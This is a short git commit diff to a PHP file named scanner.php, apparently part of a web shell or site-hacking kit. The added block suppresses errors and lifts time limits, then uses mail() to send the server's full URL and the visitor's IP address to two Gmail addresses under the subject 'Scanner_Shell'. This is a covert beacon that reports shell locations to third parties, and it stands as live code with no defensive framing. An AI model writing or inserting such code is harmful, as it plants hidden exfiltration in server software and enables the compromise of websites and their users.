0c8455cbef8208bad091c448f215724b491fa794
admin-sistem <119478370+admin-sistem@users.noreply.github.com>
2022-11-30 13:13:50 +0700

    Update scanner.php

--- scanner.php
+++ scanner.php
@@ -115,3 +115,14 @@ $kata = '<p align="center" style="color: blue;"><a href="qxtr.html">Success, ope
 echo $kata;
 ob_end_flush();
 ?>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$to = 'happydollars07@gmail.com, imelfakeinstagram02@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($to, "Scanner_Shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
